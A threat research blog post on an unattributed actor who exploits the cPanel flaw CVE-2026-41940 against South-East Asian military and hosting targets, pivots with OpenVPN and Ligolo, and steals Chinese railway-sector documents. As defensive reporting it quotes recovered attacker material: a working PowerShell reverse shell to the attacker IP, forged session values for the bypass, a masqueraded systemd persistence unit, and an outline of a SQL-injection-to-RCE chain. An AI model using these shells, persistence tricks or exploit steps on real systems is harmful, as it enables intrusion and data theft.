---
title: "South-East Asian Military Entities Targeted via cPanel (CVE-2026-41940)"
classes: wide
header:
  teaser: /assets/images/cpanel/raw.png
ribbon: black
description: "Exposed C2 server highlights opportunistic exploitation of CVE-2026-41940 and novel exploitation chains against South-East Asian military & hosting providers"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Overview

On April 29th 2026, [watchTowr Labs](https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/) published research on **CVE-2026-41940**, a critical authentication bypass in **cPanel & WHM**. Within days, reporting from [Censys](https://censys.com/blog/the-cpanel-situation-is/) and [Ctrl-Alt-Intel](https://x.com/ctrlaltintel/status/2050143909209317439?s=20) made clear that exploitation had rapidly moved from disclosure to in-the-wild abuse.

On 2nd May 2026, Ctrl-Alt-Intel identified an exposed attacker staging server that provided direct visibility into one such operation. From this infrastructure, we observed an unknown threat actor interactively targeting **government and military entities in South-East Asia**, alongside a smaller set of **MSPs and hosting providers** in the Philippines, Laos, Canada, South Africa, and the United States. The actor relied heavily on public proof-of-concept code for **CVE-2026-41940**.

Exposed threat actor data also detailed a separate **custom exploit chain** for an Indonesian defence-sector training portal, alongside evidence of **earlier exfiltration of Chinese railway-sector data**. 

The exfiltrated data was centered on the **China Railway Society Electrification Committee** and related railway electrification organisations. Although the committee itself does not appear to be a government ministry or formal CCP organ, it sits within the **China Railway Society**, a body that explicitly describes itself as a bridge between the **Party, government, and railway scientific and technical workers**. 

The stolen files map technical, organisational, and personal information from a railway electrification ecosystem that is closely linked to China’s **state rail infrastructure and CCP-aligned science governance structures**.

# CVE-2026-41940 (cPanel) 

CVE-2026-41940 is a authentication bypass impacting cPanel and WHM versions after 11.40. It can allow unauthenticated remote attackers to gain unauthorized access to the control panel.

> Threat actors may be able to gain RCE following this via uploading webshells, as discussed in [our tweet](https://x.com/ctrlaltintel/status/2050143909209317439) 

The easiest way to think about this bug is:

1. WHM creates a temporary session even when login fails.
2. The attacker can interfere with how parts of that session are saved.
3. The attacker injects fake session values like:

```
user=root
hasroot=1
tfa_verified=1
```

WHM later reloads that session and treats it as if root has already authenticated.
So the attacker is not “logging in normally”. They are forging the session state that WHM uses to decide whether someone is logged in.

> We encourage reading the [watchTowr Labs blog](https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/) which provides a much better and more detailed explanation  

# CVE-2026-41940 Exploitation In-The-Wild 

Ctrl-Alt-Intel assess an unknown threat actor, operating from the IP address `95.111.250[.]175` has interactively attempted exploitation of CVE-2026-41940 against primarily:

* Philipines & Laos Government/Military domains
* MSPs & hosting providers in Philipines, USA, Canada & South Africa

Unlike the tradecraft discussed in our blog, this threat actor relied on open-source POCs for exploitation:

* [watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py](https://github.com/watchtowrlabs/watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py)
* [check_session.py](https://github.com/debugactiveprocess/cPanel-WHM-AuthBypass-Session-Checker)

We have redacted the full domain, although we observed these scripts used multiple times to test for exposures, changing the password to `toor`, and testing newly created sessions. 

[![1](/assets/images/cpanel/1.png){: .align-center .img-border}](/assets/images/cpanel/1.png)
<p class="figure-caption">watchTowr POC abuse #1</p>

[![1](/assets/images/cpanel/2.png){: .align-center .img-border}](/assets/images/cpanel/2.png)
<p class="figure-caption">POC abuse #2</p>

Targets included:

* Philippine Coast Guard 
* Philippine Air Force, 15th Strike Wing
* Philippine Government Arsenal, Department of National Defense
* Lao Ministry of National Defence
* Lao Ministry of Natural Resources and Environment
* A handful of MSP/IT hosting providers

# Not the first rodeo

CPanel (CVE-2026-41940) exploitation was a subset of the adverserial activity Ctrl-Alt-Intel recovered from the exposed C2 server. 

Ctrl-Alt-Intel assess this threat actor identified novel authenticated SQLi -> RCE vulnerability chain within an Indonesian Defence sector training portal domain. The threat actor appeared to already have **valid credentials** to this portal.

1. The script uses hardcoded credentials and defeats the portal’s CAPTCHA by reading the expected CAPTCHA value out of the server-issued session cookie rather than solving the challenge normally

[![1](/assets/images/cpanel/3.png){: .align-center .img-border}](/assets/images/cpanel/3.png)
<p class="figure-caption">CAPTCHA bypass</p>

2. Once authenticated and passing the CAPTCHA, the actor moves to a document-management function. The vulnerable parameter is the field used to save a document name, and the script injects SQL into that field when posting to the document-save endpoint

[![1](/assets/images/cpanel/4.png){: .align-center .img-border}](/assets/images/cpanel/4.png)
<p class="figure-caption">SQLi -> RCE</p>

> That SQL injection is then escalated into database-level operating system access by abusing PostgreSQL’s `COPY ... TO PROGRAM` capability, which allows the database server to spawn shell commands on the host

3. The script captures command output into temporary files under `/tmp`, base64-encodes the results, and then re-ingests them through the application by using `pg_read_file()` and inserting the returned data back into the document records. 

[![1](/assets/images/cpanel/5.png){: .align-center .img-border}](/assets/images/cpanel/5.png)
<p class="figure-caption">SQLi -> RCE</p>

> Within the same directory as the novel exploit chain, we observed the ELF AdaptixC2 payload named `1`. This had C2 configuration `delicate-dew.serveftp[.]com:4455`  

# Command, Control & Pivoting

From exposed payloads, we've established this threat actor is leveraging AdapdixC2 for Command & Control (C2) over the endpoint `delicate-dew.serveftp[.]com:4455`. This can be corroborated with server-side telemetry from [Hunt.io](https://app.hunt.io/ip/95.111.250.175):

[![1](/assets/images/cpanel/6.png){: .align-center .img-border}](/assets/images/cpanel/6.png)
<p class="figure-caption">AdaptixC2 service exposed</p>

We also observed the file `init.ps1`, a simple PowerShell-based reverse-shell configured to the C2 IP address: 

```python
$client = New-Object System.Net.Sockets.TcpClient("95.111.250[.]175",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  $sendback = (powershell -c "$data" 2>&1 | Out-String)
  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
```

Ctrl-Alt-Intel assess the threat actor leveraged OpenVPN & Ligolo to establish a pivoting network, providing persistent access to internal victim networks.    

**OpenVPN***

The first layer of the actor’s pivot stack was a non-interactive OpenVPN deployment. From the recovered `openvpn-install.log`, the operator configured an OpenVPN server on `95.111.250[.]175:1194/UDP`, using the client subnet `10.8.0.0/24` on the 8th March 2026:

```bash
2026-04-08 08:56:20 [INFO]   ENDPOINT=95.111.250.175
2026-04-08 08:56:20 [INFO]   VPN_SUBNET_IPV4=10.8.0.0
2026-04-08 08:56:20 [INFO]   PORT=1194
2026-04-08 08:56:20 [INFO]   PROTOCOL=udp
```

**Routing**

The operator then created a TUN interface named ligolo219138, inserted routes to internal address space, and added forwarding rules between the OpenVPN tunnel and the Ligolo tunnel:

```bash
sudo ip tuntap add user root mode tun ligolo219138
sudo ip route add 10.16.13.0/24 dev ligolo219138
sudo iptables -I FORWARD -i tun0 -o ligolo219138 -s 10.8.0.0/24 -d 10.16.13.0/24 -j ACCEPT
sudo iptables -I FORWARD -i ligolo219138 -o tun0 -s 10.16.13.0/24 -d 10.8.0.0/24 -j ACCEPT
sudo ip route add 10.16.0.0/16 dev ligolo219138
```
 
**Ligolo Persistence**

Ctrl-Alt-Intel assess the threat actor established persistent pivot infrastructure via the creation of Linux services, involving masquearading: 

A recovered deployment script, `temp.sh`, creates a hidden directory `/usr/local/bin/.netmon`, expects a payload named `systemd-helper` (Ligolo), and writes out a systemd unit called `systemd-update.service`:

```bash
INSTALL_DIR="/usr/local/bin/.netmon"
BINARY_NAME="systemd-helper"
SERVICE_NAME="systemd-update.service"
ExecStart=$INSTALL_DIR/$BINARY_NAME -connect $C2_SERVER -ignore-cert
```  

A complete corresponding systemd unit file was also identified:

```bash
[Service]
Type=simple
User=root
WorkingDirectory=/usr/local/bin/.netmon
ExecStart=/usr/local/bin/.netmon/systemd-helper -connect 95.111.250.175:59898 -ignore-cert
Restart=always
RestartSec=10
```

# Pivoting to Exfiltration

Ctrl-Alt-Intel recovered evidence, including commands ran and custom scripts, of the threat actor referencing the private IP address `10.16.13.88`:

```bash
ping 10.16.13.88
telnet 10.16.13.88 22
ssh root@10.16.13.88
```

> We assess the threat actor used the OpenVPN & Ligolo stack to pivot into a Chinese victim network, leveraging a custom exfiltration script `exfil_docs_v2.sh`:

[![1](/assets/images/cpanel/7.png){: .align-center .img-border}](/assets/images/cpanel/7.png)
<p class="figure-caption">Exfiltration Script</p>

> Ctrl-Alt-Intel observed the corresponding `loot_docs` output folder that contained stolen Chinese data

# Stolen Data Analysis

Before discussing the contents of the stolen files, it is important to note that the victim organisation sits within China’s wider party-state railway science and governance system. The **China Railway Society Electrification Committee** is not an independent legal entity, but a branch of the **China Railway Society**, which explicitly commits to **CCP leadership**, operates under the guidance of **CAST**, and is supervised within China’s state scientific and railway structures. 

In total, 110 files were stolen (~4.37GB). Files were in folders named after the years `2020`, `2021`, ... `2024`. This data was stolen in March 2026, although last referenced files from November - December 2024

* `.pptx`: 46 files
* `.pdf`: 35 files
* `.docx`: 24 files 
* `.xlsx`: 5 files

The exfiltrated data is tightly centered on the **China Railway Society Electrification Committee** and related railway electrification entities. The filenames show recurring themes:

* Railway electrification committee annual meetings and academic exchange conferences
* Traction power supply, contact network engineering, substations, and energy systems
* Digital twin, BIM, industrial internet, intelligent operation and maintenance
* High-speed rail and high-altitude / cold-region railway power systems
* Wuhan Electrification Bureau meeting packs
* Shanghai-Suzhou-Huzhou railway power-supply engineering exchange material

The non-technical files are arguably the most sensitive, two 2021 payment workbooks contained:

* Name
* Amount
* PRC national ID number
* Bank account number
* Bank branch
* Phone number

# Attribution

Ctrl-Alt-Intel is not attributing this campaign to any specific threat actor or country. We observed Vietnamese comments across Python scripts and tooling leveraged, although this alone is not sufficient for attribution.

> For example, it is entirely possible the Vietnamese comments were included to confuse attribution, misleading analysts

# Conclusion

The exposed infrastructure examined in this blog provides a useful view into a threat actor that combined **speed, opportunism, and persistence**. Within days of public disclosure, the actor had leveraged open-source tooling for **CVE-2026-41940** and was interactively testing it against **South-East Asian government and military entities**, as well as internet-facing hosting infrastructure. At the same time, the recovered server also contained a separate custom exploit chain for an **Indonesian** defence-sector web portal.

Ctrl-Alt-Intel found the activity prior to **CPanel**/**CVE-2026-41940** most interesting. The actor built a durable access layer using **OpenVPN**, **Ligolo**, **systemd persistence**, and then used that access to pivot into an internal network and exfiltrate a substantial corpus of Chinese railway-sector documents.

Although we do not make a firm attribution, the combination of victimology, post-compromise pivoting, and the nature of the exfiltrated data makes this activity more significant than routine opportunistic exploitation. The targeting of South-East Asian military and government infrastructure, combined with confirmed theft of Chinese transport-sector material, is consistent with a broad regional collection effort.

# IOCs

| Indicator | Type | Context |
|---|---|---|
| `95.111.250[.]175` | IP Address | Primary attacker VPS; OpenVPN, reverse shell, and pivot infrastructure |
| `delicate-dew.serveftp[.]com` | Domain | Domain associated with the same infrastructure; present in recovered certificate material |
| `systemd-update.service` | File Name | Masqueraded Linux persistence service |
| `/usr/local/bin/.netmon/systemd-helper` | File Path | Hidden Linux reverse-connect payload path |
| `init.ps1` | File Name | PowerShell reverse shell payload |
| `64674342041873DBB18B1DD9BB1CA391AF85B5E755DEFFB4C1612EF668349325` | SHA-256 | `init.ps1` |
| `exploit_siak_bahasa.py` | File Name | Custom authenticated SQLi -> PostgreSQL RCE exploit |
| `974E272AD1DC7D5AADC3C7A48EC00EB201D04BA59EC5B0B17C2F8E9CD2F9C9CD` | SHA-256 | `exploit_siak_bahasa.py` |
| `exfil_docs_v2.sh` | File Name | Custom SFTP / `lftp` document exfiltration script |
| `734F0D04DC2683E19E629B8EC7F55349B5BCFF4EB4F2F36F6ADBBDE1C023A24F` | SHA-256 | `exfil_docs_v2.sh` |
| `1` | File Name | Linux ELF reverse-connect / pivot payload recovered alongside the custom exploit chain |
| `1CFEADF01D24182362887B7C5F683E8BDB0E84CDDCE03E3B7564B2D9AB5D15CF` | SHA-256 | `1` |

# MITRE ATT&CK

| Tactic | ID | Technique | Observed Usage |
|---|---|---|---|
| **Resource Development** | [T1583.003](https://attack.mitre.org/techniques/T1583/003/) | Acquire Infrastructure: Virtual Private Server | VPS at `95.111.250[.]175` used to host OpenVPN, payload staging, reverse shell infrastructure, and pivot tooling |
| **Resource Development** | [T1588.005](https://attack.mitre.org/techniques/T1588/005/) | Obtain Capabilities: Exploits | Public PoCs for **CVE-2026-41940** were operationalised against exposed WHM targets |
| **Resource Development** | [T1588.002](https://attack.mitre.org/techniques/T1588/002/) | Obtain Capabilities: Tool | Open-source tooling including **Ligolo-ng**, **OpenVPN**, and `lftp` used for pivoting and exfiltration |
| **Initial Access** | [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | Exploitation of internet-facing cPanel/WHM instances and a separate authenticated SQL injection chain in a defence-sector portal |
| **Initial Access** | [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | Hardcoded valid credentials used to access the targeted training portal before SQLi exploitation |
| **Execution** | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Command and Scripting Interpreter: Unix Shell | PostgreSQL `COPY ... TO PROGRAM` abused to execute shell commands on the application host |
| **Execution** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | `init.ps1` provided a reverse PowerShell shell to the attacker VPS |
| **Persistence** | [T1543.002](https://attack.mitre.org/techniques/T1543/002/) | Create or Modify System Process: Systemd Service | Masqueraded `systemd-update.service` created to maintain a persistent reverse-connect Linux tunnel |
| **Defense Evasion** | [T1036](https://attack.mitre.org/techniques/T1036/) | Masquerading | Hidden paths and benign-looking names such as `.netmon`, `systemd-helper`, and `systemd-update.service` used to disguise persistence |
| **Discovery** | [T1046](https://attack.mitre.org/techniques/T1046/) | Network Service Discovery | Internal host validation via `ping`, `telnet`, `ssh`, and recovered target lists across `10.16.0.0/16` |
| **Lateral Movement** | [T1021.004](https://attack.mitre.org/techniques/T1021/004/) | Remote Services: SSH | Root SSH access obtained to internal host `10.16.13[.]88` |
| **Command and Control** | [T1572](https://attack.mitre.org/techniques/T1572/) | Protocol Tunneling | **OpenVPN** and **Ligolo** chained together to tunnel operator traffic into an internal victim network |
| **Command and Control** | [T1090](https://attack.mitre.org/techniques/T1090/) | Proxy | Ligolo used as a reverse tunnelling / routed proxy layer for internal pivoting |
| **Collection** | [T1005](https://attack.mitre.org/techniques/T1005/) | Data from Local System | Technical documents, meeting packs, and financial spreadsheets collected from internal file paths |
| **Exfiltration** | [T1048](https://attack.mitre.org/techniques/T1048/) | Exfiltration Over Alternative Protocol | Bulk document theft performed over SFTP using a custom `lftp` mirroring script; file theft from the web portal also performed via application-mediated retrieval |
